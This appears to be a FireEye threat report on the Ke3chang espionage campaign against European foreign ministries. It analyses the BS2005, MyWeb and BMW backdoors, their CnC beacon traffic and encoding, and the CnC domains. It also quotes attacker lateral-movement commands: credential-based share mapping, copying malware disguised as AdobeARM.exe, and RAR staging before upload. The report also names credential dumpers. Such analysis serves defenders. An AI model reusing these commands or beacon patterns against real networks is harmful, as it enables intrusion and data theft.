Bennett, Ned Moran, Thoufique Haq, Mike Scott,\n and Kenneth Geers\n\n\n-----\n\n### Contents\n\n#### Executive Summary  2\n\n Command and Control Analysis 15\n\n Attribution Analysis 20\n\n Conclusion 22\n\n About FireEye 22\n\n\n-----\n\n### Executive Summary\n\nDiplomatic missions, including ministries of foreign affairs (MFA), are high-priority targets for today’s\ncyber spies. Large-scale cyber espionage campaigns such as “GhostNet” have demonstrated that\ngovernment agencies around the world, including embassies, are vulnerable to targeted cyber attacks.[1]\n\nAs the crisis in Syria escalates, FireEye researchers have discovered a cyber espionage campaign, which\nwe call “Ke3chang,” that falsely advertises information updates about the ongoing crisis to compromise\nMFA networks in Europe. We believe that the Ke3chang attackers are operating out of China and\nhave been active since at least 2010. However, we believe specific Syria-themed attacks against\nMFAs (codenamed by Ke3chang as “moviestar”) began only in August 2013. The timing of the attacks\nprecedes a G20 meeting held in Russia that focused on the crisis in Syria.[2]\n\nFireEye gained visibility into one of 23 known command-and-control (CnC) servers operated by the\nKe3chang actor for about one week. During this time, we discovered 21 compromised machines\nconnecting to the CnC server. These included what appear to be three administrative tests by the\nattackers and two connections from other malware researchers. Among the targets, we identified nine\ncompromises at government ministries in five different European countries. Eight of these compromises\nwere at MFAs.\n\nWhen FireEye had visibility on the CnC server, we saw the attackers engage in post-compromise\ninformation gathering and lateral movement on the target network, where upon FireEye immediately\ncontacted the relevant authorities and began the notification process.\n\n**The changing face of espionage**\nAlas, poor James Bond. The days are over when spies had to be both a black belt and Prince Charming\nin the same scene. Today, the vast majority of intelligence collection is conducted through signals\nintelligence. The ubiquity and vulnerability of the Internet have opened windows into the affairs of\nWashington, Beijing, and Moscow to a degree that Bond author, Ian Fleming, would never have imagined.\n\n**The advanced persistent threat**\nThe worldwide deployment of espionage-focused malware has made this generation the Golden Age\nof espionage. Global reach, stealthy maneuvers, legal cover, and plausible deniability—what more\ncould a spy ask for? That is why FireEye focuses on the vexing problem of the advanced persistent\nthreat (APT).\n\nAPT activity is best described as a campaign, a series of attacks over time. Each attack comprises a\nvariety of phases, including reconnaissance, exploitation, command and control, lateral movement,\nand exfiltration.[3] Intelligence can be extracted during each phase of the attack to build a full\nunderstanding of the tools, techniques, and procedures (TTPs) used by a particular APT campaign’s life\ncycle. However, network defenders may have only partial visibility into any single incident. That makes\ntracking and correlating activity across multiple related incidents critical.\n\n1 Information Warfare Monitor. “Tracking GhostNet: Investigating a Cyber Espionage Network”.

Tracking their activity over time has\nrevealed information on their targeting preferences and the malware tools they use. The attackers have\nused three types of malware over the years and have traditionally targeted the aerospace, energy,\ngovernment, high-tech, consulting services, and chemicals/manufacturing/mining sectors. However, the\nnumber of attacks against entities in these sectors has been small. The scarcity of individual attacks may\nindicate the attackers are selective about their targets.\n\nDuring August 2013, FireEye gained visibility on one of 22 CnC servers used at that time by the Ke3chang\nattackers. In addition to confirming compromised endpoints at several MFAs, FireEye gained unique\ninsight into the attackers’ lateral movement activities. In this report, we present the historical intelligence\nwe have gathered on the Ke3chang campaign, as well as an in-depth assessment of the ongoing\nSyrian-themed attacks against these MFAs. Our objective is to arm network defenders with information\nto combat this threat actor.\n\n**Targeting**\nTraditionally, the Ke3chang attackers have used spear-phishing emails with either a malware\nattachment or a link to a malicious download. They have also leveraged a Java zero-day vulnerability\n(CVE-2012-4681), as well as older, reliable exploits for Microsoft Word (CVE-2010-3333) and Adobe PDF\nReader (CVE-2010-2883). The Ke3chang attackers have also sent Windows screensaver files (.scr) and\nexecutable files (.exe) using the Unicode Right-To-Left-Override (RTLO) technique to cloak the original\nfilename extension from the targeted user.[4] In addition to the recent Syria-themed campaign, they also\nused a London Olympics-themed campaign in 2012 and one that involved former model and French\nfirst lady Carla Bruni in 2011.\n\n**Aerospace/Defense/Airlines**\n\n**11%** **High-tech**\n\n**23%**\n\n**Services/Consulting/VAR**\n\n**11%** **Energy/Utilities/Petroleum refining**\n\n**Federal government**\n\n**Chemicals/Manufacturing/Mining**\n\n**11%**\n\n**22%**\n\n**22%**\n\nFigure 1.

Krebs, B. “’Right-to-Left Override’\nAids Email Attacks”. September 2011.\n\n\n-----\n\n**Malware analysis and timeline**\nOver the years, the Ke3chang attackers have used three types of malware that we call: “BS2005”,\n“BMW”, and “MyWeb”. We believe these three types of malware are an evolution of a single project\nfrom a single developer or small team of developers sharing code. Functionally, it is a typical first stage\nbackdoor commonly found in APT attacks. It has the ability to upload and download files, run shell\ncommands, and sleep for a configurable length of time. All of the CnC communications are performed\nover the HTTP protocol.\n\nThe current Ke3chang campaign leverages the BS2005 malware, while older activity from 2010-2011\nleveraged BMW, followed by the MyWeb malware sporadically used in between.\n\n**BS2005: Oct 2011 – present (most recent)**\n\n**BS2005 campaign: “moviestar”**\nJust as the media began to report on possible U.S. military intervention in Syria, the Ke3chang attackers\nbegan to use this topic as a lure to trick their targets into running their malware. Although attackers\nroutinely employ breaking news as lures, the targets of this campaign, codenamed by Ke3chang as\n“moviestar”, were various ministries of foreign affairs in Europe.\n\nThe malware used in this most recent campaign is known as “BS2005”. One sample was located in a\nZIP file named “US_military_options_in_Syria.zip” (6cb633b371700d1bd6fde49ab38ca471) and contained\nthe file “US_military_options_in_Syria.pdf.exe” (b68a16cef982e6451ddf26568c60833d). This executable is\na “loader” that contains the process debugging (PDB) string:\n\n#### c:\\BS2005\\BS2005\\release\\Loader.pdb\n\nUpon execution, the loader drops another executable “ie.exe” (277487587ae9c11d7f4bd5336275a906)\nthat contains the following PDB string:\n\n#### c:\\BS2005\\BS2005\\release\\IE.pdb\n\nThis executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of\nthe backdoor. Upon execution of “ie.exe”, it beacons to a CnC host, named cascais.epac.to\n(IP: 122.10.83.51), with the following HTTP traffic pattern:\n\n#### POST /p3oahin/<filename>.aspx?r=<Base64 Encoded Data>=&a= HTTP/1.1\n\n Accept: */*\n\n Accept-Language: en-us\n\n UA-CPU: x86\n\n Accept-Encoding: gzip, deflate\n\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\n\n Host: cascais.epac.to\n\n Content-Length: 4\n\n Connection: Keep-Alive \n\n <Base64 Encoded Data>\n\n\n-----\n\nAlthough this sample uses the “/p3oahin/” path, we have observed earlier samples that used the\npath “/ke3chang/” and “/shfam9y/.” The sample we analyzed randomly chooses the <filename>\nto use in the URL from the following hard-coded list:\n\n- albumtop.aspx\n\n- blogvideo.aspx\n\n- celebrity.aspx\n\n- modules.aspx\n\n- newpage.aspx\n\n- pratty.aspx\n\n- tieback.aspx\n\n- ugctag.aspx\n\n- verycd.aspx\n\n- worldcat.aspx\n\nIn addition, each sample contains a mark or campaign tag, embedded in the Base64 callback\npayload that allows the attackers to keep track of their various campaigns. In this case, the mark\nin the Syria-themed iteration of this campaign was consistently the “moviestar” tag.\n\nEach byte of the CnC data goes through the following transformation:\n\n- The data has 0x27 plus its positional index number added to it\n\n- It is then XOR’d with its positional index number\n\n- This data is then Base64 encoded, with ‘+’ characters being replaced with ‘*’ characters when\n\nthe data is transmitted as a parameter in the URL\n\nThe Base64 data for the ‘r’ parameter decodes and decrypts to the following data format:\n\n#### <Local IP address>\n\n <Computer name>\n\n <Domain>\n\n <Campaign marker>\n\n <Date/Time>\n\n <Command identifier>\n\n <Volume serial number>\n\n <yes/no/nn>\n\n <empty line>\n\n <empty line>\n\n\n-----\n\nIn this format, the <yes/no/nn> indicates whether more data is available for command output\nor file upload. An “nn” refers to NOP/NOOP (“NO OPeration”—a beacon signal).\n\nFigure 2. BS2005 CnC\nencryption routine\n\nVarious versions of the BS2005 malware will use a different constant for the addition part\nof the encryption routine and contain other information, such as the following:\n\n- Installed mail client\n\n- Internet Explorer version\n\n- Windows version\n\n- Whether a proxy server is configured\n\n- Whether a virtual machine was detected\n\nIn addition to the Base64 data in the URI of the HTTP POST, the BS2005 malware also includes Base64\ndata in the body of the HTTP POST. The Base64 data for the POST body decodes and decrypts to one\nof the following: “no,” uploaded file content, or the output from the previous command.\n\n\n-----\n\nOnce the HTTP POST completes, the response is an HTML page with a hidden form (see Figure 3).\nA particular string sequence is expected, which contains a command ID and delimited parameters.\nAll three malware families that FireEye analyzed (BS2005, MyWeb, and BMW) follow a similar CnC\npattern in their HTTP replies.\n\nFigure 3. Rendered Web page retrieved\nby BS2005 as HTTP REPLY to HTTP POST\n\nFigure 4. HTML retrieved by BS2005.\nThe highlighted portion contains the\npost-compromise command data\nreturned back to the malware\n\n\n-----\n\nAt least one of the BS2005 samples contained a simple anti-virtual machine heuristic. Specifically,\nthe GetTickCount function is called and a loop is executed 999,999,990 times that simply increments\na variable. After this loop completes, GetTickCount is called again and the values are compared.\nIf they are the same, the process terminates.\n\nA trait common to all three malware families we analyzed is that they use the IWebBrowser2 COM\ninterface to perform their CnC communication. This programming interface allows the programmer\nto reuse code from an existing browser (typically Internet Explorer) to perform Web browsing,\nsimplifying the development process. The network communication is actually performed through the\nbrowser process, causing some misdirection when it comes to determining which process is ultimately\nresponsible for generating this network traffic. This technique is nothing new for malware, but FireEye\ndid notice something interesting in BS2005’s behavior.\n\nBS2005 attempts to kill any processes named “maxthon.exe” or “360se.exe.” The “360se.exe” process\nseems to make sense, because it relates to 360 Chinese anti-virus software. But why the malware would\nbe programmed to terminate Maxthon, a free browser developed by a Chinese company, was\ninitially unclear.\n\nUpon further investigation, we found that if a Maxthon browser is open while the BS2005 malware uses\nthis IWebBrowser2 COM interface to navigate to a Web page, the Maxthon browser opens a new tab\nand visibly navigates to the Web page itself. Instead of using other APIs to make Web requests and read\nresponses, the BS2005 developer apparently dealt with this issue by simply killing any Maxthon browser\nprocesses running on the target computer. This lack of sophistication is present throughout the code in\nall three malware families (BS2005, MyWeb, and BMW). BS2005 is actually the most complex of the three,\nwhich makes sense given that it is the most recent malware family we have seen.\n\nImprovements in the BS2005 version of the malware include a “sleep until date/time” command and\nweak encryption for all CnC data; previous iterations (MyWeb and BMW) did not encrypt the host\ninformation sent in the beacon.\n\n**BS2005 campaign: “snake”**\nIn 2011 a campaign, labeled “snake” by the attackers, started using the theme of nude photos\nof the French prime minister’s wife, Carla Bruni, as a lure. Attackers sent an email to various targets\nthat encouraged recipients to download a password-protected RAR file (see Figure 5).\n\nThe malware contained within the RAR was named “carla_bruni_nude_pics_spp.scr”\n(727ef86947f5e109435298e077296a42 ). When executed, the BS2005 malware connected\nto a CnC server with the following HTTP traffic pattern:\n\nFigure 5. BS2005 “snake” campaign\nemail attack vector\n\n\n-----\n\n#### POST /ke3chang/Directx.aspx?r=<Base64 Encoded Data> HTTP/1.1\n\n Accept: */*\n\n Accept-Language: en-us\n\n User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\n\n Accept-Encoding: gzip, deflate\n\n Host: g20news.ns01.us\n\n Content-Length: 4\n\n Connection: Keep-Alive\n\n <Base64 Encoded Data>\n\nThe CnC server’s hostname in this case contains the string “g20news”; because of this, FireEye believes\nthat the targets of the “snake” campaign may have been related to the G20 finance ministers meeting\nheld in Paris, France on October 15, 2011.\n\n**BS2005 campaigns: “dream/dolphin”**\nIn 2012, another series of attacks began that leveraged information about the London Olympics in an\nattempt to lure targets into clicking on malicious attachments (see Figure 6 and Figure 7). Based on\ninformation from the FireEye[®] Dynamic Threat Intelligence[™] (DTI) cloud, we observed that this campaign\ntargeted a single firm in the Chemicals/Manufacturing/Mining sector.\n\nThese attacks leveraged older exploits in Adobe PDF Reader (CVE-2010-2883) and Microsoft\nWord (CVE-2010-3333). These BS2005-laced samples (ecc1167a5f45d72c899303f9bbe44bbc and\nb391d47b37841741a1817221b946854a) connected to the following CnC servers:\n\n- news.studenttrail.com\n\n- skyline.ns1.name\n\nFigure 6. BS2005 “dream/dolphin” campaign 2012\nOlympic-themed decoy content—daily competition schedule\n\n\n-----\n\nFigure 7. BS2005 “dream/dolphin”\ncampaign 2012 Olympic-themed decoy\ncontent— early check-in communication\n\nThe HTTP callback pattern to the CnCs in these cases was modified slightly from the earlier path\nof “/ke3chang/” to “/shfam9y/”.\n\n#### POST /shfam9y/Default.aspx?r=<Base64 Encoded Data>a= HTTP/1.1\n\nThis could represent an attempt to avoid any network-based signatures that detect based on the\nspecific URL path of earlier samples. Lastly, the addition constant for the CnC encryption routine in\nthese two BS2005 samples is 0x7C.\n\n**BS2005 campaign: “newtiger”**\nThree months after the Olympics-themed attacks, FireEye observed a new BS2005 campaign\nlabeled “newtiger,” which is possibly a reference to an older 2010 campaign labeled “tiger.” The\ndecoy content in this case is a threat report from a well-known security vendor (see Figure 8). Using\ninformation from the FireEye DTI cloud, FireEye observed that this campaign targeted a single firm\nin the Services/Consulting sector.\n\n\n-----\n\nFigure 8. BS2005 “newtiger” campaign\nsecurity-themed decoy content\n\nThe sample used in this attack (50dd931b85891168244a10073f4a6f79) dropped BS2005 malware\nthat connected to the CnC www.trap.dsmtp.com and used the “/shfam9y/” URI path.\n\n**MyWeb: Jan 2010 – May 2011**\nThe Ke3chang attackers used the older “MyWeb” malware family from 2010 to 2011. The MyWeb\nsample that FireEye analyzed has a compile date of 1/20/2011. At least one of the attacks in this\ncampaign leveraged a European security and defense-themed lure, which aligns with the targeting\npreferences for this group.\n\nMyWeb is the second-generation malware used by this threat actor; it was used after BMW but before\nBS2005. Improvements over BMW include an anti-sandbox detection technique, a configurable sleep\nvalue for the CnC beacon loop, and a consolidated configuration block that enables the malware\nauthor to change the CnC domain without having to recompile the malware.\n\nMyWeb’s anti-sandbox detection technique calls GetSystemTime, saving the value, then looping\n500,000 times calling GetSystemTime for each loop; finally, the malware compares the milliseconds\nvalue of the last call with the value saved from the first call. If the values are equal, the malware process\nterminates silently.\n\nThe MyWeb configuration is stored in a 104-byte block of encoded data appended to the end of the\nportable executable (PE) file. To decode the configuration data, each character has its positional index\nnumber added to it. The CnC domain is stored at offset 0x0. Upon successful connection to the CnC\nserver, the malware sleeps for the amount of time that is stored in seconds at offset 0x20. The sleep\nvalue used for CnC connection failures is stored in minutes at offset 0x30.\n\n\n-----\n\nFigure 9. MyWeb configuration\nblock decode routine\n\nFigure 10. Decoded MyWeb\nconfiguration block\n\nMyWeb only encrypts the command results data sent back to the CnC server using the same weak\nencryption algorithm as BS2005 (see Figure 2). The addition constant for the encryption routine for the\nsample we analyzed (be58180f4f7ee6a643ab1469a40ffbca) is 0x5A. The beacon data is transmitted\nin URL parameters in plaintext and is self-explanatory:\n\n#### hxxp://ensun.dyndns.org/MYWEB/SearchX.ASpX?id1=<local IP address>&id2=<computer name>&id3=<volume serial number>&id4=<32 random alphabet characters>\n\nDownloaded and uploaded files are simply Base64 encoded. Command results are encrypted and\nthen Base64 encoded.\n\n**BMW: July 2010**\nBMW is the earliest iteration of this malware that FireEye has seen and was used by the Ke3chang\nattackers in older 2010 attacks. The initial infection vector is unknown; however, BMW was presumed\nto be delivered via weaponized email attachments/links—similar to the newer campaigns leveraging\nMyWeb and BS2005. The samples we analyzed have a compile date of 2010/07/08.

The attackers shift IP addresses frequently and often point their CnC domains to\nlegitimate IP addresses when they are not in use. To date, we have observed the following domains\nused by each of these malware families:\n\nBS2005\n\n- g20news.ns01.us\n\n- news.studenttrail.com\n\n- skyline.ns1.name\n\n- www.trap.dsmtp.com\n\n- ftp.backofficepower.com\n\n- news.freewww.info\n\n- blackberry.dsmtp.com\n\n- adele.zyns.com\n\n- windowsupdate.serveuser.com\n\n- officescan.securitynh.com\n\n- yahoo.concursv.com\n\n- cascais.epac.to\n\n- www.errorreporting.sendsmtp.com\n\n- www.sumba.freetcp.com\n\n- google.winfy.info\n\n- cname.yahoo.sendsmtp.com\n\nBMW\n\n- mail.yahoo.sendsmtp.com\n\n- update.msntoole.com\n\nMyWeb\n\n- expo2010.zyns.com\n\n- win7.sixth.biz\n\n- ensun.dyndns.org\n\n- www.spaces.ddns.us\n\n- blog.strancorproduct.info[5]\n\n5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the “Eourdegh”\nvariant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a\n\n\n-----\n\nWe have mapped out the relationship between the CnC servers for all three malware families and have\nfound that they have shared common historical IP addresses in the past.\n\nFigure 11. Common Ke3chang CnC\ninfrastructure\n\nUsing the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then\nmapped all the IP addresses that these domains resolved to. We then collected any other domains\nthat also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.\n\nFigure 12. Expanded Ke3chang\nCnC infrastructure\n\n\n-----\n\nUpon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China,\nand Hong Kong.\n\nFigure 13. Geolocation of Ke3chang\nCnC infrastructure\n\n**Ke3chang CnC control panel**\nUpon accessing one of the Ke3chang CnC servers, we found that the attackers have a Web-based\ncontrol panel that allows them to interact with compromised computers, as shown in Figure 14.\n\nFigure 14. Ke3chang CnC control panel\n\nThe control panel also contains a link to an “AutoScanner” feature that includes several preconfigured\ncommands to gather information about a compromised system and perform network reconnaissance\non the endpoint (see Figure 15).\n\n\n-----\n\nFigure 15. Ke3chang\nAutoScanner commands\n\nFigure 16. Ke3chang AutoScanner\ncommand panel output\n\n**Information gathering / lateral movement analysis**\nOnce a compromised system connects to the CnC server, the Ke3chang attackers follow a\npredetermined script. They first gather information about the local computer and the network to\nwhich it is connected. FireEye found the following tools on the CnC server, which the attackers\nused to steal logon credentials and move laterally across the network:\n\n#### • a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe\n\n gsecdump v0.7 by [REDACTED] ([REDACTED]@truesec.se)\n\n • 291503be3c25e52382f2a54420d03d71 gsl.exe\n\n gsecdump v0.6 by [REDACTED] ([REDACTED]@truesec.se)\n\n • 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe\n\n NetE v1.0 Questions, comments, bitches and bugs to\n [REDACTED]@cultdeadcow.com\n\n • 8cf6e698ecf3e167321a3ed2b9a9c62f PwDul2.exe\n\n 8cf6e698ecf3e167321a3ed2b9a9c62f PwDump62.l.exe\n\n Usage: PwDul2.exe [-x][-n][-h][-o output_file][-u user]\n [-p password][-s share] machineName\n\n\n-----\n\nAfter running the standard commands available in the AutoScanner, the attackers often used the\n“net group” command to acquire information about specific network groups revealed in the preconfigured commands. This step was done manually; we found several instances of typing errors,\nsuch as the following:\n\n#### • net group “[REDACTED]” /doamin\n\n • net group /doamin\n\nThe attackers then listed information for specific users, focusing on users and groups suspected of\npossessing advanced rights such as domain administrators and service accounts that have access\nto a wide range of systems.\n\nThen they used the “net use” command to map network drives, including some that required a\npassword, as follows:\n\n#### • net use \\\\[REDACTED] [REDACTED]:J: /user:[REDACTED]\n\nIn some cases, they appeared to try and move laterally by copying a file (always initially called\n“msn.tmp”) to other machines on the network. They frequently changed the destination directory\nand filename of the target file, presumably to make finding the malware more difficult for incident\nresponders upon initial discovery.\n\n#### • net use \\\\172.xx.xx.x [REDACTED] /u:172.xx.xx.x\\[REDACTED]\n\n • dir \\\\172.xx.xx.x\\c$\n\n • dir “\\\\172.xx.xx.x\\c$\\Program Files\\Adobe”\n\n • copy C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\msm.tmp “\\\\172.xx.xx.x\\c$\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe” /y\n\nThe attackers then deleted the network shares:\n\n#### • net use \\\\[REDACTED] /del\n\nAfter that, attackers gathered specific data of interest (such as the listings of all files in certain\ndirectories), and compressed it all within the RAR archive as follows:\n\n#### • %temp%/wmp32.dll a -m5 –hp[REDACTED] %temp%/tem.rar %temp%\\*dir*.*\n\nThey then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from\nthe compromised system:\n\n#### • dir %temp%/tem.rar \n\n • del C:\\DOCUME~1\\[REDACTED]\\[REDACTED]\\Temp\\tem.rar\n\nDuring our window of visibility, FireEye found evidence that the attackers were able to enumerate the\nvarious target networks, move laterally to compromise new systems, and finally to gather information\nthat was compressed and uploaded to the CnC server. However, FireEye lost visibility on this Ke3chang\nCnC server before the attackers shifted to the major data exfiltration phase.\n\n\n-----\n\n### Attribution Analysis\n\nDetermining attribution requires more than just malware analysis.[6] It requires an understanding of the\nattackers activities across the attack life cycle (or “kill chain”), along with an assessment of contextual\nindicators, such as the targeting, timing, and scope of the attacks.[7] Unfortunately, this level of visibility\nis not always available, which often leaves significant gaps in analysis. Therefore, exploring competing\nhypotheses is important, as is recognizing, and acknowledging areas of uncertainty.[8]\n\nMoreover, “attribution” can have multiple meanings. Some use it to refer to an ultimate beneficiary,\nsuch as a nation-state, while others use the term to refer to malware authors or CnC operators.[9]\n\nDuring our investigation, FireEye focused on technical clues left by the malware authors and CnC\noperators. Within the malware binaries themselves, linguistic clues point to the malware authors’\nuse of the Chinese language, as seen in Figure 17.\n\nFigure 17.

The subset of CnC servers that were not hosted by dynamic DNS infrastructure was\nregistered using a registrar in China (XIN NET) and the WHOIS records indicate that the registrant is in\nChina. The following email addresses were used to register those non-dynamic CnC domains:\n\n- xiaoxiao_222@yahoo.com\n\n- tk329@yahoo.com\n\n- zsy@gmail.com\n\nDuring our period of visibility into the BS2005 “moviestar” campaign against various ministries of\nforeign affairs in Europe, FireEye discovered that the attackers had initially tested the malware in\nvirtual machines, prior to compromising actual targets. We retrieved the output of the commands the\nattackers had run when testing the malware. The output indicates that the Ke3chang attackers are\ntesting their malware in Windows operating systems, with the default language set to Chinese.\n\nFigure 18. Test CnC output generated by\nthe Ke3chang actor after infecting their\ntest endpoints with BS2005 malware\n\nBased on this circumstantial evidence we believe that the Ke3chang attackers are operating within\nChina. But their exact identities and motivation remain unknown.\n\n\n-----\n\n### Conclusion\n\nMinistries of foreign affairs in Europe have been targeted and compromised by a threat actor we call\nKe3chang. This attack used the crisis in Syria as a lure to deliver malware to its targets. The timing of the\nattack precedes the G20 meeting in Russia that focused on the crisis in Syria. Furthermore, FireEye has\npresented evidence indicating that the Ke3chang attackers have been active since at least 2010 and\nhave attacked targets related to G20 meetings in the past.\n\nDuring our investigation, we were able to observe the inner workings of one of the CnC servers used by\nthe attackers. As a result, we were able to identify some of the victims of the attack, as well as gather\ncircumstantial evidence that indicates that the attackers may be operating from China.\n\nDuring our brief window of visibility into one of the known 22 CnC nodes, FireEye observed the attackers\nconducting reconnaissance and moving laterally throughout the compromised networks. Relevant\nauthorities were immediately notified upon this discovery, and FireEye began its worldwide target\nnotification process. At that time, FireEye did not observe the attackers exfiltrating sensitive data;\nhowever, we believe the Ke3chang attackers likely began attempting to exfiltrate sensitive data\nshortly thereafter.\n\nAccordingly, diplomatic missions, including ministries of foreign affairs, continue to be targeted by\nmalware-based espionage campaigns.\n\nThis report demonstrates that attackers are able to successfully penetrate government targets using\nexploits for vulnerabilities that have already been patched and despite the fact that these ministries\nhave defenses in place. This illustrates the limitations of traditional defenses and highlights the need for\nsecurity strategies that not only leverage advanced technologies designed to defend against targeted\nthreats, but also the incorporation of threat intelligence and an incident response capability.\n\nTo learn more about FireEye, visit www.FireEye.com.\n\n**About FireEye**\nFireEye has invented a purpose-built, virtual machine-based security platform that provides realtime threat protection to enterprises and governments worldwide against the next generation of\ncyber attacks.
